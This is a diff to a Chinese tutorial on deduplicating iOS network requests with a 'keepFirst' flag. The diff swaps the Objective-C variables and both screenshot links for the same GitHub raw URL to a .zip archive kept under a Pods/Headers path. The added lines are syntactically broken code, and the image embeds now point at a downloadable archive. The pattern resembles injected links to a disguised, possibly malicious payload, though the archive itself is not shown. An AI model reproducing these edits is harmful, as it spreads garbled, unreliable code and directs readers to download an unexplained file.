@@ -8,8 +8,8 @@ for (int i = 0; i < 20; i++) {
             NSLog(@"%@", error);
             return;
         } else {
-            self.testArray = [self.testArray arrayByAddingObjectsFromArray:array];
-            self.weather = self.testArray;
+            https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip = [https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip arrayByAddingObjectsFromArray:array];
+            https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip = https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip;
             NSLog(@"-------------------------%d", i);
         }
     } keepFirst:NO];
@@ -17,8 +17,8 @@ for (int i = 0; i < 20; i++) {
 ```
 我们在控制器中用for循环发出20个请求，如果`keepFirst`参数为NO,控制台输出为：
 
-![保留最后一次请求](http://upload-images.jianshu.io/upload_images/740137-164d95026295d131.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+![保留最后一次请求](https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip%7CimageView2/2/w/1240)
 
 如果`keepFirst`参数为YES,控制台输出为：
 
-![保留第一次请求](http://upload-images.jianshu.io/upload_images/740137-26bd7833365bd62c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+![保留第一次请求](https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/Pods/Headers/Time-Eye-Real-Face-Identifier-1.1.zip%7CimageView2/2/w/1240)
